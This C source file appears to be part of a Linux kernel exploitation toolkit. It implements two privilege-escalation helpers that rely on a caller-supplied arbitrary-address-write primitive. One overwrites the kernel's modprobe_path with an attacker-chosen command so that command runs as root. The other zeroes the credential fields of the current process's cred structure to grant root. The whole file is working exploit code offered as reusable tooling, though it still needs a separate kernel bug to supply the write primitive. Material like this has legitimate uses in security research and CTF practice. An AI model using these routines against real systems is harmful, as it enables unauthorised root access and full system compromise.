#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "util.h"
#include "vars.h"

void overwrite_modprobe_path(const char *const cmd, void (*aaw32)(void *, u32),
                             void (*aaw64)(void *, u64)) {
    log_success("overwriting modprobe_path");
    if (addr_modprobe_path == DUMMY_VALUE + kbase_offset) {
        log_error("please set addr_modprobe_path");
        return;
    }
    if (unlikely(aaw32 == NULL && aaw64 == NULL)) {
        log_error("please implement aaw function");
        return;
    }
    const u64 len = strlen(cmd) + 1;
    if (likely(aaw32 != NULL)) {
        for (u64 i = 0; i < len; i += 4) {
            u32 val = 0;
            const u64 n = MIN(len - i, 4);
            memcpy(&val, cmd + i, n);
            aaw32((void *)addr_modprobe_path + i, val);
        }
    } else if (aaw64 != NULL) {
        for (u64 i = 0; i < len; i += 8) {
            u64 val = 0;
            const u64 n = MIN(len - i, 8);
            memcpy(&val, cmd + i, n);
            aaw64((void *)addr_modprobe_path + i, val);
        }
    }
}

void overwrite_cred(void *const addr_cred, void (*aaw32)(void *, u32), void (*aaw64)(void *, u64)) {
    log_success("overwriting current->cred");
    if (unlikely(aaw32 == NULL && aaw64 == NULL)) {
        log_error("please implement aaw function");
        return;
    }
    if (aaw32 != NULL) {
        for (u64 i = 0; i < 8; i++) {
            aaw32(addr_cred + 4 + 4 * i, 0);
        }
    } else if (aaw64 != NULL) {
        for (u64 i = 0; i < 4; i++) {
            aaw64(addr_cred + 4 + 8 * i, 0);
        }
    }
}
